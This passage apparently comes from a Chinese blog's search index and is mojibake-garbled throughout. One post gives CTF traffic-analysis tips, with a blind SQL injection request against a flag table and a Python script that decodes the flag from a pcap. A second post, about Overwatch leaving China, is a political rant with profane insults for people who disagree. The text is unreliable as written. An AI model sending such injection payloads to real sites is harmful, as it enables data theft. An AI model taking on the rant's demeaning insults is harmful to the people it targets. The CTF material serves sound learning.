·å¾ˆå½±å“åè¾¹çš„åˆ¤æ–­ã€‚ä½†æ˜¯å¦‚æœæ˜¯æµé‡æ–‡ä»¶éšå†™äº†ä¸ªæ–‡ä»¶ï¼Œè¿™ä¿©å·¥å…·è¿˜æ˜¯æŒºå¥½ç”¨çš„ã€‚\nå¯¼å‡ºæ–‡ä»¶æ“ä½œå‘¢ï¼Œä¸ç†Ÿæ‚‰wiresharkçš„å¯èƒ½ä¸ä¼š\nå…·ä½“å°±æ˜¯\nå·¦ä¸Šè§’æ–‡ä»¶â€”&gt;å¯¼å‡ºå¯¹è±¡\n\nè¿˜æœ‰ä¸€ç§æ˜¯æµé‡åŒ…ä¸­å­˜åœ¨è¢«base64ç¼–ç è¿‡çš„æ–‡ä»¶\nç»å…¸çš„èœåˆ€666ï¼Œä¹‹å‰ä¹Ÿæœ‰å†™è¿‡ï¼Œåœ¨è¿™é‡Œ\nSQLç›²æ³¨æµé‡è¿™ä¸€å—åœ¨æ—¥å¿—åˆ†æï¼Œæµé‡åˆ†æä¸­éƒ½ä¼šæ¶‰åŠï¼Œè€ƒåˆ°äº†ä¹Ÿä¸éš¾ï¼Œå°±æ˜¯é‚£ä¸€ç§é¢˜å‹\nä¹‹å‰ä¹Ÿåœ¨è¿™é‡Œå†™è¿‡\nä¹‹å‰æ²¡æœ‰æä¾›è„šæœ¬ï¼Œè¿™è¾¹ç»™å¤§å®¶ä¸€ä¸ªï¼Œä½†æ˜¯éœ€è¦æ ¹æ®å…·ä½“é¢˜ç›®è‡ªå·±æ”¹ä¸€æ”¹\n#GET /index.php?act=news&amp;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),%2038,%201))&gt;125import rea = []with open (&quot;sqltest.pcapng&quot;,&quot;rb&quot;) as f:#è¯»å–pcapæ–‡ä»¶    for i in f.readlines():        if (b&quot;id=1%20and%20ascii(substr(((select%20concat_ws(char(94),%20flag)%20%20from%20db_flag.tb_flag%20%20limit%200,1)),&quot; in i):            #print(i)            a.append(i)#æŠŠè¿™äº›ä¸œè¥¿æåˆ°aæ•°ç»„é‡Œa1 = &#123;&#125;for i in a:    #print(i)    b = re.search(br&quot;%200,1\\)\\),%20(\\d+),%201\\)\\)&quot;,i).group(1)    c = re.search(br&quot;&gt;(\\d+) HTTP/1.1&quot;,i).group(1)    #print(b)    #print(c)    a1[int(b)] = int(c)#ä»aå¼€å§‹è°ƒå‡ºæ¥#print(a1)flag =&#x27;&#x27;for i in range (1,39):    flag+=(chr(a1[i]))print(flag)#æ•´æˆä¸€è¡Œ\n\nUSBæµé‡åˆ†æè¿™ä¸€å—å¸¸è€ƒçš„å°±æ˜¯é”®é¼ ï¼Œéƒ½è€ƒçƒ‚äº†ï¼Œåº”è¯¥ä¸ä¼šéš¾ï¼Œ2022å›½èµ›æ¢æ±¤ä¸æ¢å‡ºäº†ä¸€ä¸ªï¼Œä¹Ÿæ˜¯ç»™æˆ‘æ•´æ‡µé€¼äº†ï¼Œè¿™é‡Œè¾¹åˆ†äº†ä¸¤å—ï¼Œä¸€éƒ¨åˆ†æ˜¯èƒ½è·‘å‡ºä¸ªå‹ç¼©åŒ…ï¼Œå¦ä¸€éƒ¨åˆ†æ˜¯å¯†ç ï¼Œåˆšå¼€å§‹æ²¡æ„è¯†åˆ°ï¼Œè·‘å‡ºæ¥raræŸåï¼Œç„¶åæŠŠé˜Ÿå‹æ€è·¯éƒ½æ•´åäº†ï¼Œéƒ½åœ¨ä¿®rarï¼Œæˆ‘çš„é”™æˆ‘çš„é”™ã€‚\næ¯”è¾ƒéš¾çš„ï¼Œè§è¿‡ä¸€ä¸ªæ•°ä½æ¿è¿™é‡Œå†™è¿‡\nè¿˜å¯èƒ½ä¼šå‡ºç°ä¸€äº›æ‰‹æŸ„ï¼Œåˆ»å­—æœºå•¥çš„ã€‚\nç„¶åæ¨èé›ªæ®‡ä»¥åŠå…¶ä»–ä¸¤ä½å¤§ä½¬å…±åŒå†™çš„ä¸€ä¸ªå·¥å…·ï¼Œåªèƒ½è¯´tql\nå·¥å…·åœ¨è¿™é‡Œ\næ ¹æ®é¢˜ç›®è¦æ±‚åšé¢˜è¿™éƒ¨åˆ†ä¸€å®šè¦è®¤çœŸè¯»é¢˜ï¼Œå¯èƒ½å¹¶ä¸æ˜¯æ‰¾flagï¼Œä¸€å®šè¦çœ‹æ¸…æ¥šè®©ä½ æ‰¾å•¥ï¼Œæ¯”å¦‚è¯´ä¸€äº›å·¥æ§é¢˜ç›®ï¼Œwebshellæ¯”å¦‚è¿™ä¸ª\nè¿™éƒ¨åˆ†é‡Œä¹Ÿæœ‰ä½ ä»æœªæ¥è§¦è¿‡çš„çŸ¥è¯†ï¼Œè¿™æ ·å¯ä»¥ä»”ç»†çœ‹ä¸€ä¸‹è¿½è¸ªæµï¼Œæ‰¾æ‰¾æœ‰ä»€ä¹ˆè§„å¾‹ï¼Œæ¯”å¦‚2021å›½èµ›é¢˜ç›®robotï¼Œä¹‹å‰ä¹Ÿæ˜¯å†™è¿‡\nè¿˜æœ‰å°±æ˜¯ç¬¬äºŒå±Šç½‘åˆƒæ¯ï¼šå–œæ¬¢ç§»åŠ¨çš„é»‘å®¢ã€LED_BOOM\nä¸€å®šä¸€å®šè¦è®¤çœŸè¯»é¢˜ï¼Œè®¤çœŸåˆ†æï¼Œè®¤çœŸæ‰¾è§„å¾‹ã€‚\næ€»ç»“æµé‡åˆ†æå¤§ä½“æ€è·¯\n\n\næ‹¿åˆ°åï¼Œå…ˆçœ‹ä¸€ä¸‹é¢˜ç›®é¢˜å¹²ï¼Œç„¶åå…ˆfind\nå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä¸æ˜¯httpï¼Œè‹¥æœæ˜¯å…ˆç»Ÿè®¡httpè¯·æ±‚çœ‹ä¸€ä¸‹ï¼Œæˆ–è€…æ˜¯æ”¾åˆ°ç§‘è±é‡Œï¼Œæ€»ä½“çœ‹ä¸€ä¸‹\nå¯¼å‡ºå¯¹è±¡ï¼Œçœ‹ä¸€ä¸‹\nè¿½è¸ªæµï¼ŒæŒ¨ä¸ªæµçœ‹ï¼Œå¦‚æœå¾ˆå¤šï¼Œå€’ç€çœ‹\nstringè·‘ä¸€ä¸‹\næ˜¯ä¸æ˜¯usbï¼Œè·‘è„šæœ¬\næœ‰æ²¡æœ‰éšå†™\næœ‰æ²¡æœ‰å¤§ä¸²ç¼–ç \nä»æ¥æ²¡è§è¿‡çš„åè®®ï¼Œå»ç™¾åº¦\nè®°å¾—æŠŠæ–‡ä»¶æ”¾010editoré‡Œçœ‹ä¸€ä¸‹\n\n\nè¿™éƒ¨åˆ†è¿˜ç®—æ˜¯æ¯”è¾ƒç®€å•ï¼Œç®—æ˜¯åŸºç¡€å§ï¼Œåƒé‚£äº›WiFiï¼Œè¢«åŠ å¯†è¿‡çš„æµé‡ï¼Œéƒ½è¿˜æ²¡æœ‰å†™ï¼Œå› ä¸ºé‚£äº›æˆ‘ä¹Ÿç©çš„ä¸é›\n","tags":["flow","Misc","study"]},{"title":"é—²èŠâ€”â€”çºªå¿µå®ˆæœ›å…ˆé”‹å›½åŒºåœæœ","url":"/2023/01/24/ow/","content":"åœ¨ä¸€åˆ‡çš„å¼€å§‹, ä½œä¸ºä¸€åæ™®é€šä¸­å›½çš„å®ˆæœ›å…ˆé”‹ç©å®¶, å¯¹äºæˆ‘æ¥è¯´, è¿™æ— ç–‘æ˜¯ä¸€åœºæ‚²å‰§, æˆ‘æƒ³é¦–å…ˆå£°æ˜ä¸€ä¸‹, åœ¨è¿™åœºæ‚²å‰§é‡Œ, æˆ‘ä¸ç«™è¾¹, æˆ‘é€‰æ‹©ä¸­ç«‹, å¸Œæœ›å¤§å®¶ä¸è¦ç»™æˆ‘æ‰£å¸½å­\nå®ˆæœ›å…ˆé”‹åœ¨1.23-1.24æ—¥ æˆ‘å’Œwananä»¥åŠScofield, ä¸€ç›´é™ªä¼´å®ˆæœ›å…ˆé”‹èµ°å®Œäº†æœ€åçš„è·¯, æœ€åå‡ å±€åŸºæœ¬å°±éƒ½æ˜¯å’Œå¹³å±€äº†, æ‰€æœ‰ç©å®¶æ„å¤–çš„æ¸©æŸ”, ä¹Ÿæ²¡æœ‰å–·å­, å¤§å®¶å‡‘ä¸€å †, äº’ç›¸çœ‹çœ‹, èŠèŠå¤©æ‹æ‹ç…§, æˆ‘ä¹Ÿå¾ˆè£å¹¸æ˜¯å…¶ä¸­ä¸€å‘˜. è™½ç„¶å½“æ—¶å®ˆæœ›å…ˆé”‹å¹¶æ²¡æœ‰å¼ºåˆ¶ä¸‹çº¿, ä½†æ˜¯å¤§å®¶ä¹Ÿæ²¡æœ‰ç©çš„å¿ƒæ€äº†\n\n\nå°±è¿™æ ·è¿‡äº†äºŒåå‡ åˆ†é’Ÿ, å¤©ä¸‹æ²¡æœ‰ä¸æ•£çš„å®´å¸­, æˆ‘è¿˜æ˜¯é€€å‡ºäº†æ¸¸æˆ\n\næš´é›ªå…³äºæš´é›ª, åœ¨å›½å†…æ˜¯æ¯”è¾ƒç»Ÿä¸€çš„é£å‘, å¤§å®¶éƒ½å–·æš´é›ª, è§‰å¾—æ˜¯æš´é›ªçš„éœ¸ç‹æ¡æ¬¾é€¼èµ°äº†ç½‘æ˜“, å½“ç„¶ä¹Ÿä¸æ˜¯æ²¡æœ‰å¯èƒ½, å¹¶ä¸”å°ç²‰çº¢ä»¬æœ€çˆ±çš„æœ€ä¿¡ä»»çš„è§‚å¯Ÿè€…ç½‘ä¹Ÿæ˜¯å‘è¡¨äº†è¿™ä¸€ç³»åˆ—è¨€è®º\n\nå¯¹äºè¿™äº›è¨€è®º, ç†Ÿæ‚‰è§‚å¯Ÿè€…ç½‘å°¿æ€§çš„äºº, å½“ç„¶æœ‰è‡ªå·±çš„åˆ¤æ–­èƒ½åŠ›, è§‚å¯Ÿè€…ç½‘æœ€å–œæ¬¢è´©å–ä¸­å›½äººçš„çˆ±å›½æƒ…æ€€, é€šä¿—ç‚¹å°±æ˜¯è¯´, è§‚å¯Ÿè€…ç½‘ä¸€ç›´åœ¨ä¼ æ’­ä¸­å›½äººåšä»€ä¹ˆéƒ½æ˜¯å¯¹çš„, ä½†å‡¡å¤§è„‘å‘è‚²æ­£å¸¸çš„,  å°±èƒ½åˆ¤æ–­å‡ºè¿™æ˜¯æ— ç–‘æ˜¯ä¸€ç§é”™è¯¯çš„è§‚ç‚¹, æ¯•ç«Ÿæˆ‘ä»¬ä¼Ÿå¤§çš„é¢†è¢–ğŸ±éƒ½æ‰¿è®¤è‡ªå·±çš„é”™è¯¯(æ–‡é©)\nç„¶åæˆ‘å°±å¼€å§‹åœ¨ç™¾åº¦å’ŒBç«™å°è¯•æ”¶é›†æ¯”è¾ƒå®¢è§‚çš„ä¿¡æ¯\nç„¶åæ€»ç»“ä¸€ä¸‹, å®¢è§‚çš„ä¿¡æ¯è¿˜æ˜¯å¾ˆå°‘, åŸºæœ¬ä¸€è¾¹å€’çš„è¯´æš´é›ªæ˜¯ä»€ä¹ˆç»¿èŒ¶å•Šä¹‹ç±»çš„, å½“ç„¶ä¹Ÿæœ‰æœ‰è„‘å­çš„äººæå‡ºäº†è¿™ä¸ªç½‘æ˜“çš„å®åŠ›ä¸å¤§è¡Œ. è¿™é‡Œä¸ºä»€ä¹ˆè¯´ä¸€è¾¹å€’çš„ä¿¡æ¯å°±ä¸å®¢è§‚å‘¢, mdæˆ‘çœŸä¸æƒ³è§£é‡Šè¿™ä¸€ç‚¹,  ä½ ä»¬å¯ä»¥è‡ªè¡Œè§‚çœ‹è€æ¢çš„è¿™ä¸ªè§†é¢‘, ä¸€è¾¹å€’çš„ä¿¡æ¯éƒ½ç›¸ä¿¡çš„äºº, æˆ‘å¯ä»¥å¤§è‡´åˆ†ä¸ºè¿™ä¹ˆå‡ ç±», ä¸€æ˜¯è„‘æ®‹ç²‰, äºŒæ˜¯å¤§è„‘å‘è‚²ä¸å¥å…¨. å½“ç„¶æˆ‘ä¸€èˆ¬å–œæ¬¢æŠŠè¿™ä¸¤ç±»ç±»å½“ä½œåŒ…å«å…³ç³»\nç„¶åç™¾åº¦å‘¢, æˆ‘æ¨èå¤§å®¶çœ‹ä¸€ä¸‹è¿™ä¸ªæ–°é—»æœ‰è„‘å­çš„äººå°±çŸ¥é“, è¿™tmæ‰å«æ–°é—», è°tmå‘ä¸ªæ–°é—»ä¸å»æ‘†äº‹å®, è€Œæ˜¯ä¸€å‘³çš„åå‘ä¸€æ–¹è¯´. ç„¶è€Œå¤§éƒ¨åˆ†äººå‡ºæ¥å‘æ–‡ç« å‘è§†é¢‘å•¥çš„, ç†è®ºä¾æ®éƒ½æ˜¯æ¥è‡ªç½‘æ˜“å‘æ–‡, æ˜¯çœ‹ä¸æ‡‚æš´é›ªå‘æ–‡å—, è¿˜æ˜¯è¯´æ ¹æœ¬æ²¡æœ‰äººå¸®ä½ æ¬è¿åˆ°å¢™å†…, è¿˜æœ‰ä¸€äº›äººè€æ˜¯å»è¿‡åº¦è§£è¯», ç¾è¨€ä¹‹å°ç¼–è®¤ä¸º\n\nè¿™é‡Œæåˆ°äº†ä¸€ä¸ªè£å‘˜é—®é¢˜, ç”±äºæˆ‘ä»¬ä¼Ÿå¤§çš„ğŸ»åšæŒä¸‰å¹´å˜æ€æ¸…é›¶(ä¸çŸ¥é“ä»–ä¸ºå•¥éè¦åšæŒ, å¯èƒ½æ˜¯è‡ªå·±è¿˜ä¸å¦‚ä¸ª0å§), å¯¼è‡´æˆ‘ä»¬å„å¤§å…¬å¸æ— å¥ˆè£å‘˜, ä½ è£å‘˜å¯ä»¥, ä½ tmæŠŠæš´é›ªé‚£è¾¹çš„äººä¹Ÿè£äº†, è¿™tmå‡ºäº†äº‹å’‹åŠ. æš´é›ªæå‡ºå¼‚è®®æ˜¯æ­£å¸¸çš„, ä½†æ˜¯æ— å¥ˆå•Š, ä¸è£å‘˜ä¹Ÿå‘ä¸èµ·å·¥èµ„. æ‰€ä»¥è¯´, å½“æš´é›ªæå‡º, è¿˜æ²¡æ‰¾åˆ°ä¸‹å®¶, ä¸å¸Œæœ›è®©ç©å®¶æŸå¤±, æƒ³å†åˆä½œå…­ä¸ªæœˆ, ä½†æ˜¯ç½‘æ˜“ä¸åŒæ„å•Š, è¿™æ—¶å€™é‚£äº›æ— è„‘ç‹¼ç‹—åˆè·³å‡ºæ¥äº†, å–Šä»€ä¹ˆç½‘æ˜“åšçš„å¥½, ä»–ä»¬æ±‚ç€å¤åˆå’±ä¸åŒæ„, å¤ªäº‰æ°”äº†, ä½ tmç©ä¸ªæ¸¸æˆéƒ½è¦å½“å´äº¬, è¿™å¾—æ˜¯ä»€ä¹ˆæ— è„‘å„¿. ç„¶è€Œç½‘æ˜“ä¸ºå•¥ä¸å¤åˆ, æ˜¯è·Ÿä½ ä»¬è¿™äº›äººä¸€æ ·æ— è„‘ä¸ºäº†ä¸è’¸é¦’å¤´äº‰å£æ°”å—? å¦‚æœä»–ä¹Ÿæ— è„‘å°±ä¸ä¼šæˆä¸ºå¤§å‚äº†, å¤§æ¦‚ç‡åŸå› æ˜¯, è£å‘˜æ²¡äººäº†, è¿‡å¹´æœŸé—´äººæ›´å°‘, é‚£äº›æš´é›ªå‘˜å·¥éƒ½æ’µå›å®¶äº†, ä½ è®©æˆ‘æŠŠä»–ä»¬è¯·å›æ¥, æ€ä¹ˆå¯èƒ½.\næœ‰å¾ˆå¤šäººå°±æŠŠç½‘æ˜“å’Œæš´é›ªæ¯”ä½œæƒ…ä¾£æˆ–è€…æ˜¯å¤«å¦»å˜›, æˆ‘ä¸ªäººä¹Ÿè®¤ä¸ºè¿™ä¸ªæ¯”å–»å¾ˆæ°å½“. é‚£ä¹ˆç©å®¶å‘¢å°±å¯ä»¥è¯´æ˜¯å­©å­. å¤«å¦»ä¿©é—¹ç¦»å©šæŸå¤±æœ€å¤§çš„å°±æ˜¯æˆ‘ä»¬å­©å­, è¿™æ—¶å€™å°±ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ä½ åˆ°åº•è·Ÿè°, ä½†å‡¡è¿™ä¸ªå­©å­æ˜¯æ­£å¸¸ç‚¹çš„å°±ä¼šæƒ³åˆ°, è·Ÿè°éƒ½å¤Ÿå‘›æœ‰å¥½æ—¥å­, åçˆ¹åå¦ˆéƒ½ä¸å¯èƒ½å¯¹ä½ å¥½. ä½†æ˜¯åæœ‰ä¸€äº›æ— è„‘å„¿å°±éå¾—å»è·Ÿä»–çˆ¹, ä»–çˆ¹è¯´ä»€ä¹ˆå°±æ˜¯ä»€ä¹ˆ, å¹¶ä¸”è¿˜éª‚ä»–å¦ˆæ˜¯å©Šå­,æ˜¯ç»¿èŒ¶. æœ‰ä¸€å¤©, ä»–å¦ˆæ”¾å¿ƒä¸ä¸‹å­©å­, è·Ÿä»–çˆ¹è¯´å’±ä»¬è¦ä¸å†åšæŒå‡ å¹´, ç­‰è¿™å­©å­é•¿å¤§æˆäººäº†å’±å†ç¦»å©š, ä»–çˆ¹ä¸åŒæ„, ä»–çˆ¹æ—©å°±æŠŠåºŠéƒ½å–äº†, ä½ è¿™å›æ¥ä½å“ª. ç„¶åå­©å­å‘¢è¿˜è¯´, æˆ‘çˆ¹åšçš„å¤ªå¯¹äº†, ä¸æ„§æ˜¯æˆ‘ä»¬ç‹æ°å®¶æ—çš„, å¤ªnbäº†, å°±ä¸èƒ½ç®¡ç€é‚£ç»¿èŒ¶. \n\n\né‚£ä¹ˆä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§å­©å­å‘¢?å¤§å®¶éƒ½çŸ¥é“å­©å­å¤©ç”Ÿæ˜¯ä¸€å¼ ç™½çº¸.å­ä¸æ•™, çˆ¶ä¹‹è¿‡. åŸæ¥å•Šä»–å¥¶æ˜¯è€å°å»ºä»å°å°±ä¸è®©ä»–è·Ÿå¤–è¾¹çš„å°å­©ç©, å› ä¸ºä»–å¥¶åœ¨æ‘é‡Œæ˜¯è‡­åæ˜­è‘—, æ€•å­™å­çŸ¥é“äº†, ä¸å–œæ¬¢å¥¶å¥¶äº†, ä»–çˆ¹å‘¢åˆä¸æ•¢åæŠ—ä»–å¥¶, å› ä¸ºä»–çˆ¹ä½çš„æˆ¿å­éƒ½æ˜¯å¥¶å¥¶çš„, ä»–å¥¶å¥¶æŠŠé™¢å¢™(gfw)ä¿®çš„å¾ˆé«˜, é—¨ä¹Ÿæ˜¯ç»å¸¸é”ç€, ä¸€èˆ¬ä¸è·Ÿä»»ä½•äººæ¥å¾€, ä»–çˆ¹å¥½ä¸å®¹æ˜“æ‰¾äº†ä¸ªå¤–åœ°å‚»åª³å¦‡, åˆå› ä¸ºç§ç§ä¸åˆç¦»å©šäº†, ä»–çˆ¹æ˜¯å•ƒè€æ—, è¿˜æ˜¯è¢«è¿«çš„,å› ä¸ºå¥¶å¥¶ä¸æ•¢è®©ä»–å‡ºå», æ€•ç®¡ä¸ä½ä»–. å¦ˆå¦ˆä¹Ÿä¸ç”¨å‡ºå»å·¥ä½œ. çˆ¸å¦ˆç¦»å©šå, å­©å­ä¹Ÿå°±æ–­ç»äº†è·Ÿå¦ˆå¦ˆçš„äº¤å¾€, æ‰€ä»¥çˆ¸çˆ¸è¯´å•¥å°±æ˜¯å•¥.\n\né‚£ä¹ˆè¿™ä¸ªå­©å­è¿˜èƒ½ä¸èƒ½åƒæ­£å¸¸å­©å­ä¸€æ ·å‘¢, ä»–åªèƒ½é€šè¿‡åå¤©è‡ªå·±çš„åŠªåŠ›, å¥½å¥½å­¦ä¹ , ç”šè‡³æ˜¯ç¿»é™¢å¢™å‡ºå»å­¦ä¹ , è·Ÿåˆ«çš„å­©å­å¤šäº¤æµäº¤æµ, å¤šäº†è§£åˆ«äººè¯´ä»€ä¹ˆ, è€Œä¸æ˜¯å¥¶å¥¶è¯´ä»€ä¹ˆ.\nreaction ä¸€é¦–rapä½ ä»¬çš„ç™½å«–æ‰‹æ®µæ˜¯ä»å“ªä¸ªç½‘ç«™çªƒå–çš„æ®µå­#ç™½å«–: real?æ˜¾å¾—å‚²æ…¢åˆå©Šæ°”çš„æš´é›ªè¯´ç€æ— èŠçš„æš—ç¤º#æš´é›ªè¯´ä»€ä¹ˆäº†?ä¸æ˜¯ç½‘å‹ä¸€ç›´åœ¨ççŒœ?æˆ‘ä»¬ä¹Ÿä¸careç©ä½ çš„æ¸¸æˆåŠä½ å›å®¶åæ€#ä½ ä¸æ˜¯ç©å®¶, ä½ æ€ä¹ˆä»£è¡¨&#x27;æˆ‘ä»¬&#x27;ä¸å°Šé‡æˆ‘ä»¬å´å¿˜è®°äº†æ˜¯ä¸­å›½ç©å®¶ç»™ä½ é¥­åƒ#æš´é›ªé¢å‘å…¨çƒçš„å…¬å¸, é ä¸­å›½ç©å®¶åƒé¥­???ä½ è¦æŠ±ç€æ±‚å¤åˆäº†ä½ ä»¬æ˜¾å¾—çœŸå»‰ä»·#æ±‚ä½ äº†å—?æˆ‘ä»¬èº«æ­£ä¸æ€•å½±å­æ–œæ‰€ä»¥æ²¡äººè¯´é—²è¯#è¯´ä½ é—²è¯çš„ä½ ä¸çœ‹, å°±è£…ä½œæ²¡æœ‰æ˜¯å§ä½ æš—é‡Œæ˜é‡Œåªä¼šè€äº›è§ä¸å¾—äººçš„éšœçœ¼æ³•#ä½ æ˜¯æš´é›ªé«˜ç®¡å—?è¿˜æ˜¯è¯´ä½ å‚åŠ è°ˆåˆ¤äº†?ä½ æ€ä¹ˆä»€ä¹ˆéƒ½çŸ¥é“å“‡å…„å¼Ÿ ä½ çœŸæ˜¯å¥½å¤§ä¸€æœµç™½è²èŠ±#å¼€å§‹é˜´é˜³å˜´è‡­æŠŠä½ ä»¬é‚£æ¸£ç”· éƒ½é²¨çƒ·æˆ‘å¯ä¸å«Œè¿™ç‚¹éº»çƒ¦å°±ç®—æ²¡æœ‰ä½ æˆ‘ä»¬ä¾æ—§ç»§ç»­å‘å±•ç»ˆæ­¢è¿™åœºåˆä½œä¸å¾—ä¸è¯´ä½ ä»¬çœŸçš„å¤§èƒ†æ˜å¹´çš„ä»Šå¤©å°±æ˜¯ä½ çš„å¿Œæ—¥æˆ‘å»ç»™ä½ ä»¬é€ç›†èŠ±ç¯®#ç½‘æ˜“å’Œæš´é›ªçœŸä¸ä¸€å®šå“ªä¸€ä¸ªå…ˆæ­»è€ä¸€ç‚¹ç ´æ‰‹æ®µæ‰€ä»¥ä¸‹ä¸æ¥å°ä½ é‚£æ¶è‡­çš„æ ·å­æ—©å·²åå£°åœ¨å¤–#åŒæ ·é€ç»™ccpçŒªå‚æ‰ä¸ä¼šå’Œä½ åŒæµåˆæ±¡å’Œä½ è¯´å£°æ‹œæ‹œ#ç»§ç»­å˜´è‡­å½“ç„¶åœ¨å‡†å¤‡æ‹‰é»‘ä½ ä»¬ä¹‹å‰é€ä½ ä¸€é¦– çˆ±æƒ…ä¹°å–ç»ç’ƒæ¸£æ¸£æ€»çˆ±ç©è¿‡å®¶å®¶å¬ä½ ä»¬çš„èƒ¡è¨€ä¹±è¯­åƒåœ¨å½å½å–³å–³å¯ç°åœ¨ç•™ä½ ä»¬çš„æ—¶é—´åªå‰©æ»´æ»´ç­”ç­”åˆ«æ€»å½“å°ä¸‘æ²¡ç©ºé™ªä½ ä»¬å˜»å˜»å“ˆå“ˆç»ç’ƒæ¸£æ¸£æ€»çˆ±ç©è¿‡å®¶å®¶å¬ä½ ä»¬çš„èƒ¡è¨€ä¹±è¯­åƒåœ¨å½å½å–³å–³å¯ç°åœ¨ç•™ä½ ä»¬çš„æ—¶é—´åªå‰©æ»´æ»´ç­”ç­”åˆ«æ€»å½“å°ä¸‘æ²¡ç©ºé™ªä½ ä»¬å˜»å˜»å“ˆå“ˆã€\n\næ•´é¦–æ­Œçš„æ­Œè¯åˆ¨æå°±è¿™æ ·, æˆ‘ä¹Ÿæ‡’å¾—å»è¾“ä»–çš„ä»€ä¹ˆæŠ¼éŸµ, åœ¨æˆ‘çœ‹æ¥ä¹Ÿæ²¡æœ‰ä»€ä¹ˆpunchline, æ—‹å¾‹ä¹Ÿæ˜¯æ¯”è¾ƒå¹³, å»¶ç»­äº†ä»–ä¸€ç›´çš„è¯´å”±é£æ ¼, è™½ç„¶å¬æ„Ÿä¸é”™, ä½†æ˜¯ä»–çš„æ­ŒåŸºæœ¬éƒ½è¿™æ ·, ä¹Ÿæ˜¯æˆ‘æ›¾ç»æ¯”è¾ƒè®¤å¯ä»–çš„åŸå› . \næˆ‘æœ€åˆå–œæ¬¢rapæ˜¯å› ä¸ºTom MacDonald, ä»–ä¼šä»£è¡¨å¼±åŠ¿å‘å£°, ä»–ä¼šæ•¢äºå”±å‡ºä¸åŒçš„å£°éŸ³, è€Œä¸æ˜¯åƒå¤§éƒ¨åˆ†å›½å†…åœ°ä¸Šrap, çœŸæ­£ä¸Šå‡åˆ°ä¸€å®šé«˜åº¦å°±æ²¡æ³•æ’­æ”¾äº†. æˆ‘å–œæ¬¢rapçš„real/freedom/åšè‡ªå·±/æœ‰è¯ç›´è¯´. è‘«èŠ¦è¿™é¦–æ­Œå€’æ˜¯åšåˆ°äº†æœ‰è¯ç›´è¯´, ç›´æ¥å˜´è‡­éª‚äºº, ä½†æ˜¯æ²¡æœ‰åšåˆ°real, åœ¨æˆ‘çœ‹æ¥å°±æ˜¯éšå¤§æµ, ä»æ­Œè¯å†…å®¹ä¹Ÿèƒ½çœ‹å‡ºæ¥, æ¯«æ— ä¾æ®, å•çº¯éšå¤§æµ. å°±åƒæˆ‘ä¸å–œæ¬¢GAIä¸€æ ·, ä½ tmä¸€ä¸ªæ¯’éƒ½å¸çš„äºº, è¿˜å¥½æ„æ€å‡ºæ¥è£…nmçš„æ­£é¢äººç‰©, ä»¥ä¸ºè¶…ç¤¾ä¼šä¸‹æ¶, å¸æ¯’ä¸è´©æ¯’çš„åšæ–‡åˆ é™¤å°±èƒ½è£…ä½œå¥½äººäº†, å°±ä¸è¯´å”±çš„ä»€ä¹ˆå±±æ­Œä¸ç¬¦åˆæˆ‘å£å‘³, mdè¿˜è¯´ä»€ä¹ˆæ±Ÿæ¹–æ°”æ¯, é‚£tmæ‰€è°“çš„æ±Ÿæ¹–, ä»€ä¹ˆæ¢å±±å¥½æ±‰, ä¸å°±æ˜¯tmç°åœ¨çš„ç—å­, æ‰«é»‘é™¤æ¶æ—©tmç»™ä½ æ‰“äº†. è¿˜æœ‰äººè¯´ä»€ä¹ˆä¸­å›½é£, è´©å–çˆ±å›½æƒ…æ€€, çº¯æœ‰ç—…, ä½ tmä¸­å›½äººå°±æ˜¯ä¸€å¸®ç—å­???éƒ½tmä¸¢æˆ‘è„¸, è®©å…¨çƒéƒ½çŸ¥é“ä½ tmä¼šæ­¦æœ¯,çˆ±æ‰“äºº?\næˆ‘å‘æ¥æ˜¯æŠŠåšæ­Œå’Œåšäººåˆ†å¼€çœ‹å¾…çš„, å°±åƒæˆ‘è®¤ä¸ºäººæƒå’Œäººå‘½æ˜¯åˆ†å¼€çš„, æˆ‘ä¼šè®¤ä¸ºäººæƒéƒ½æ²¡æœ‰äº†, åšäººæœ‰ä»€ä¹ˆç”¨ likeä¸è‡ªç”±æ¯‹å®æ­», likeæ­Œæ‰‹æ­Œå¥½å¬å°±è¡Œäº†\nä½†æ˜¯æˆ‘ä¸ºä»€ä¹ˆä¼šå¬pgone, è®¨åŒGAIå‘¢, å› ä¸ºGAIå»è´©å–ä»€ä¹ˆä¸­å›½é£çˆ±å›½æƒ…æ€€ï¼Œå–œæ¬¢ä¼ªè£…è‡ªå·±ï¼Œæˆ‘ä¸å–œæ¬¢ä¸€ä¸ªäººç‰¹åˆ«è£…ï¼Œè¡¨é‡Œä¸ä¸€ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯è¿èƒŒé»‘æ€•ç²¾ç¥çš„ï¼Œä»–å°±ä¸æ˜¯ä¸€ä¸ªåˆæ ¼çš„rapperï¼Œå°±åƒæ— è„¸ç”·è‘«èŠ¦, éšå¤§æµ, æ²¡æœ‰è‡ªå·±çš„æ€è€ƒ, æ²¡æœ‰è‡ªå·±çš„è€ƒè¯.\nä¸­å›½ç”µç«å¬è¯´æš´é›ªå·²ç»ç¦æ­¢ä¸­å›½å‚åŠ ç‚‰çŸ³èµ›äº‹äº†\n\nå…³äºåŸå› , æˆ‘æ²¡æœ‰åœ¨ç½‘ä¸Šæ‰¾åˆ°ç›¸å…³è¨€è®º, æˆ‘ä¸ªäººè®¤ä¸ºæœ€å¤§åŸå› å°±æ˜¯gfwä½ tmä¸­å›½æŠŠäººå®¶å¢™äº†, äººå®¶å¾—è´¹å¤šå¤§åŠ², ä¸å¦‚ç›´æ¥ä¸è®©ä½ ä»¬å‚åŠ æ¥çš„æ–¹ä¾¿, è€Œä¸”ä¸­å›½ç©å®¶, å¤–æŒ‚æ˜¯çœŸçš„å¤š, æ¸¸æˆç´ è´¨çœŸçš„ä½. ç»™èµ›äº‹åŠ å¤§å‹åŠ›. \nè¿˜æŠŠäººå®¶éª‚ä¸Šçƒ­æœ, ä½ æ€ä¹ˆä¸æ•¢å»éª‚ccp, éª‚gfw\nä¸ä¼šæœ‰äººå’Œæˆ‘é«˜ä¸­æŸåŒå­¦ä¸€æ ·, ä»¥ä¸ºæ¯ä¸ªå›½å®¶éƒ½æœ‰é˜²ç«å¢™å§. ç„¶é¹…ç°å®æ˜¯, å¤§éƒ¨åˆ†æ¸¸æˆåˆ†ä¸ºä¸­å›½æœå’Œä¸–ç•Œæœ, 